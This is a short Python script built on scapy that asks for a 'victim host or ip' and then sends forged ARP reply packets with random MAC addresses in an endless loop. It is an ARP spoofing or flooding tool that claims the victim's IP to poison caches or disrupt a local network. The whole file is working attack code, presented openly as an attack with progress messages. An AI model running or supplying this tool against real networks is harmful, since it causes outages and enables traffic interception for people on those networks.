#!/usr/bin/env python
from scapy.all import *
import os, sys
from os import system
from termcolor import colored, cprint

os.system('cls' if os.name == 'nt' else 'clear')
try:
    dest_random = RandIP()
    print("\n")
    cprint(colored("[+] Made by Aniket [+]", "yellow", attrs=["blink"]))
    print("\n")
    user = str(input(colored("[*] Enter victim host or ip (deault: random-ip):> " or f"{dest_random}", "red")))
    print("\n")
    cprint(colored("[*] Attack under progress ...", "magenta", attrs=["blink"]))
    cprint(colored("[*] CTRL+c for stop the Attack", "green", attrs=["blink"]))
except:
    os.system('cls' if os.name == 'nt' else 'clear')
    cprint(colored("[+] Made by Aniket [+]", "yellow", attrs=["blink"]))
    cprint(colored("Try again something error or missing", "red", attrs=["blink"]))
    sys.exit()
while 1:
    try:
        dest_mac = RandMAC()
        src_mac = RandMAC()
        sendp(Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc=user, hwsrc=src_mac, hwdst=dest_mac)/Padding(load="X"*18), verbose=0)
    except:
        os.system('cls' if os.name == 'nt' else 'clear')
        cprint(colored("[+] Made by Aniket [+]", "yellow", attrs=["blink"]))
        cprint(colored("[+] Ctrl+c detected", "red", attrs=["blink"]))
        sys.exit(1)
